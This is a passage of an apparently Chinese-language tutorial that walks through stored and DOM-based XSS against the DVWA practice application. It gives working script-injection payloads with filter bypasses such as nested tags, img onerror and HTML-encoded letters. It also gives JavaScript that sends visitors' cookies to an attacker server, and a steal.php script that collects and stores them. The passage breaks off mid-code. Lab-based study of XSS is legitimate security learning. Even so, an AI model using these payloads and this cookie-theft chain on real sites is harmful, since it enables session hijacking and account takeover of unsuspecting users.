+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出对有害输入没有任何过滤，直接将用户提交的内容插入数据库，输入点在两个输入框都有，但是后面的几种难度都对Message域的输入内容进行了htmlspecialchars转义，为了和后面的一致，我们将payload插入Name域测试xss,在此之前用firebug将Name输入框的maxlength改为600，一开始为10，然后输入payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name:&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">Message:testxss</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141867763086.png!small" alt="通过DVWA学习XSS"></p>
+<p>简单的一个弹框，弹框可见我们的payload已经储存到了数据库，只要访问该页面的用户都会触发xss。</p>
+<p>  <img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141868089792.png!small" alt="通过DVWA学习XSS"></p>
+<p>下面我们编写payload偷取该网站下用户的cookie，构造payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name:&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">Message:testxss</span><br></pre></td></tr></table></figure>
+
+<p>用script标签加载远程服务器上我们编写的获取cookie的js代码，上一节我们编写的是下面的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;form action=&apos;http://192.168.50.150/dvwaxss/steal.php&apos; name=&apos;exploit&apos; method=&apos;post&apos; style=&apos;display:none&apos;&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;input type=&apos;hidden&apos; name=&apos;data&apos; value=&apos;&quot;+document.cookie+&quot;&apos;&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;/form&gt;&quot;);</span><br><span class="line">document.exploit.submit();</span><br></pre></td></tr></table></figure>
+
+<p>这段js代码的作用是在页面中构造一个隐藏表单和一个隐藏域，内容为当前的cookie，并且以post方式发送到同目录下的steal.php，但是这种方式有个缺点就是将cookie发送到steal.php后他会刷新页面跳转到steal.php，这样的做法难免会引起用户的怀疑，我们需要用一种更为隐蔽的方式，这里我们用ajax技术，一种异步的javascript,在不刷新页面的前提下神不知鬼不觉的将用户的cookie发送到steal.php。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var url = &quot;http://192.168.50.150/dvwaxss/steal.php&quot;;</span><br><span class="line">var postStr = &quot;data=&quot;+document.cookie;</span><br><span class="line">var ajax = null;</span><br><span class="line">if (window.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = new XMLHttpRequest();</span><br><span class="line">&#125; else if (window.ActiveXObject) &#123;</span><br><span class="line">    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ajax=null;</span><br><span class="line">&#125;</span><br><span class="line">ajax.open(&quot;POST&quot;, url, true);//true代表异步</span><br><span class="line">ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">ajax.send(postStr);</span><br></pre></td></tr></table></figure>
+
+<p><strong>上面编写的代码创建了一个ajax对象，构造了一个post请求将用户的cookie作为参数发送到了<a href="http://192.168.50.150/dvwaxss/steal.php，也就是当前目录下的steal.php。" target="_blank" rel="noopener">http://192.168.50.150/dvwaxss/steal.php，也就是当前目录下的steal.php。</a></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">$conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">mysql_select_db(&quot;dvwacookie&quot;,$conn);</span><br><span class="line">if(isset($_GET[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_POST[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;select * from low&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    while($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>steal.php将我们获取到的cookie存到数据库中，我们先删除目标网站数据中之前我们插入的payload，然后输入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name:&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">Message:send cookie use ajax</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/15141868804083.png!small" alt="通过DVWA学习XSS"></p>
+<p>用src加载远程服务器的js脚本，那么js就是该网站所信任的，那么js的源就会变成加载它的域，从而可以读取该域的数据，比如用户cookie，我们将请求提交后可以看到当前页面将<code>http://192.168.50.150/dvwaxss/cookie.js</code>加载了进来。</p>
+<p>用src加载远程服务器的js脚本，那么js就是该网站所信任的，那么js的源就会变成加载它的域，从而可以读取该域的数据，比如用户cookie，我们将请求提交后可以看到当前页面将<code>http://192.168.50.150/dvwaxss/cookie.js</code>加载了进来。</p>
+<p><strong>然后观察firebug的javascript控制台，看到</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已拦截跨源请求：同源策略禁止读取位于 http://192.168.50.150/dvwaxss/steal.php 的远程资源。（原因：CORS 头缺少 &apos;Access-Control-Allow-Origin&apos;）</span><br></pre></td></tr></table></figure>
+
+<p><strong>这是因为ajax严格遵从同源策略，当前加载cookie.js的域为<a href="http://192.168.50.128:8080,所以ajax不能读取不同域http://192.168.50.150下的数据，但是cookie已经被发送到了http://192.168.50.150域，steal.php已经将偷取到的cookie存放在了数据库中,而且页面没有刷新，很隐蔽。" target="_blank" rel="noopener">http://192.168.50.128:8080,所以ajax不能读取不同域http://192.168.50.150下的数据，但是cookie已经被发送到了http://192.168.50.150域，steal.php已经将偷取到的cookie存放在了数据库中,而且页面没有刷新，很隐蔽。</a></strong></p>
+<p><strong>还有一种方式，为了更好的兼容浏览器，我们可以使用juery ajax</strong> <strong>删除目标网站之前的payload，输入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name:&lt;script src=&quot;http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">Message:send cookie use juery ajax</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用juery前要先<script src="http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js"></script>引入</strong><br><strong>由于dvwa中guestbook的name字段有长度限制，为了实验效果，我们用phpmyadmin将name列的varchar改为1000</strong><br><strong>服务端juery代码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">    $.post(&quot;http://192.168.50.150/dvwaxss/steal.php&quot;,&#123;data:document.cookie&#125;);</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><strong>上面的代码同样的构造post请求将cookie作为post参数发送给steal.php</strong><br><strong>然后提交我们的输入</strong><br><strong>可见页面加载了我们的cookie.js</strong></p>
+<p><strong>同时ajax也执行了</strong></p>
+<p><strong>cookie也被偷取到了</strong></p>
+<h3 id="medium级别-1"><a href="#medium级别-1" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>主要过滤的地方有</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name    = trim( $_POST[ &apos;txtName&apos; ] );    </span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line">$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );</span><br></pre></td></tr></table></figure>
+
+<p><strong>对mtxMessage进行了htmlspecialchars转义，但是没有转义txtName，只是把<script>替换为了空，和之前的反射型xss一样，转化为大写<SCRIPT>或者<scr<script>ipt>绕过即可，下面的和low级别利用方式一样，这里不再重复</strong></p>
+<h3 id="high-级别-1"><a href="#high-级别-1" class="headerlink" title="high 级别"></a>high 级别</h3><p><strong>代码如下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>触发点还是在Name域，和反射型xss high级别的过滤方法一样</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line">$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br></pre></td></tr></table></figure>
+
+<p><strong>用img标签绕过即可，有不明白的地方参考上一节反射型，编写payload验证xss的存在,输入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name:&lt;img src=# onerror=&quot;alert(&apos;xss&apos;)&quot;&gt;</span><br><span class="line">Message:test xss</span><br></pre></td></tr></table></figure>
+
+<p><strong>弹框，证明有xss的存在</strong></p>
+<p><strong>接下来编写payload获取用户cookie，用firebug将maxlength改为1000，再输入之前先将之前插入数据库的payload删除，然后输入</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name:&lt;img src=# onerror=&apos;var url=&quot;http://192.168.50.150/dvwaxss/steal.php&quot;;var postStr=&quot;data=&quot;+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject(&quot;M&amp;#x69;crosoft.XMLHTTP&quot;);&#125;else&#123;ajax=null;&#125;ajax.open(&quot;POST&quot;, url, true);ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded&quot;);ajax.send(postStr);&apos;&gt;</span><br><span class="line">Message:send cookie use ajax</span><br></pre></td></tr></table></figure>
+
+<p><strong>直接在onerror后使用ajax将当前网站用户的cookie用ajax发送到<a href="http://192.168.50.150/dvwaxss/steal.php,为了绕过过滤对所有”i”这个字母进行了html编码，为&amp;#x69">http://192.168.50.150/dvwaxss/steal.php,为了绕过过滤对所有”i”这个字母进行了html编码，为&amp;#x69</a>;</strong><br><strong>提交payload</strong><br><strong>查看元素</strong></p>
+<p><strong>查看firebug控制台，有</strong></p>
+<p><strong>已拦截跨源请求：同源策略禁止读取位于 <a href="http://192.168.50.150/dvwaxss/steal.php">http://192.168.50.150/dvwaxss/steal.php</a> 的远程资源。（原因：CORS 头缺少 'Access-Control-Allow-Origin'）,可以看出ajax已经执行，将cookie发送到<a href="http://192.168.50.150/dvwaxss/steal.php">http://192.168.50.150/dvwaxss/steal.php</a></strong> </p>
+<p><strong>偷取到的cookie被steal.php存入数据库</strong> </p>
+<p><strong>另外一种方式是利用juery ajax</strong></p>
+<p><strong>编写payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name:&lt;img src=# onerror=&quot;var a=document.createElement(&apos;scr&amp;#x69;pt&apos;); a.setAttr&amp;#x69;bute(&apos;src&apos;, &apos;http://cdn.stat&amp;#x69;c.runoob.com/l&amp;#x69;bs/jquery/1.10.2/jquery.m&amp;#x69;n.js&apos;); document.getElementsByTagName(&apos;head&apos;)[0].appendCh&amp;#x69;ld(a);var b= document.createElement(&apos;scr&amp;#x69;pt&apos;); b.setAttr&amp;#x69;bute(&apos;src&apos;,&apos;http://192.168.50.150/xss_s/cook&amp;#x69;e.js&apos;);</span><br><span class="line">document.getElementsByTagName(&apos;head&apos;)[0].appendCh&amp;#x69;ld(b);&quot;&gt;</span><br><span class="line">Message:send cookie use juery ajax</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171202/kFf17l0K8f.png?imageslim"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<p><strong>同样的为了绕过过滤对所有的字母”i”进行html编码</strong><br><strong>onerror里的js代码是利用javascript DOM操作动态创造script标签，然后用setAttribute给src赋值，分别加载<a href="http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js和http://192.168.50.150/xss_s/cookie.js">http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js和http://192.168.50.150/xss_s/cookie.js</a></strong><br><strong><a href="http://192.168.50.150/xss_s/cookie.js代码为">http://192.168.50.150/xss_s/cookie.js代码为</a></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">$.post(&quot;http://192.168.50.150/dvwaxss/steal.php&quot;,&#123;data:document.cookie&#125;);</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><strong>和上面的一样</strong> ，<strong>提交payload</strong>   </p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171202/I0cjED1FAK.png?imageslim"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<p><strong>javascript DOM操作已经在页面重新加载时在head标签下创造了两个script标签去加载js脚本</strong> </p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171202/iLEc1fc3B5.png?imageslim"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<p><strong>cookie已经发送给了<a href="http://192.168.50.150/dvwaxss/steal.php">http://192.168.50.150/dvwaxss/steal.php</a></strong> </p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171202/BikaeL0LGh.png?imageslim"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<p><strong>被steal.php存入数据库</strong> </p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171202/Gib2a8E6jA.png?imageslim"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<h2 id="dvwa-DOM型XSS"><a href="#dvwa-DOM型XSS" class="headerlink" title="dvwa DOM型XSS"></a>dvwa DOM型XSS</h2><h3 id="dom-xss"><a href="#dom-xss" class="headerlink" title="dom xss"></a>dom xss</h3><p>xss主要分为三种，前面通过了dvwa分别研究了反射型和存储型两种xss，这次写篇有关dom xss的文章，dom xss和前面的两种xss的区别主要是：dom xss的产生并没有和后台服务器产生交互，而是通过浏览器的dom树解析产生的，下面来学习一下这种xss。</p>
+<h3 id="测试环境-2"><a href="#测试环境-2" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口<br>一台win7虚拟机，ip为192.168.50.156,用来接受漏洞网站的cookie，web由phpstudy搭建</p>
+</blockquote>
+<h3 id="low级别-2"><a href="#low级别-2" class="headerlink" title="low级别"></a>low级别</h3><p><strong>服务器端没有任何php代码，查看前端页面源代码，处理用户输入的只有前端的js代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">    var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们从选择列表选择的值赋值给default附加到url后，这段js代码将url中default的值赋给option标签的value属性节点和文本节点</strong><br><strong>构造payload:<a href="http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%22xss%22)%3C/script%3E,弹框证明有xss的存在，浏览器在解析html">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%22xss%22)%3C/script%3E,弹框证明有xss的存在，浏览器在解析html</a> dom树时就会触发js弹框代码</strong>   </p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171221/mfllfKgda8.PNG"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<p><strong>接下来利用dom xss获取网站的cookie，构造连接</strong>   </p>
+<p><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</code><br><strong>用script标签加载远程服务器上我们编写的获取网站用户cookie的js代码,和之前的一样利用ajax</strong></p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171221/L6LJae1A9c.PNG"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var url = &quot;http://192.168.50.156/dvwaxss/steal.php&quot;;</span><br><span class="line">var postStr = &quot;data=&quot;+document.cookie;</span><br><span class="line">var ajax = null;</span><br><span class="line">if (window.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = new XMLHttpRequest();</span><br><span class="line">&#125; else if (window.ActiveXObject) &#123;</span><br><span class="line">    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    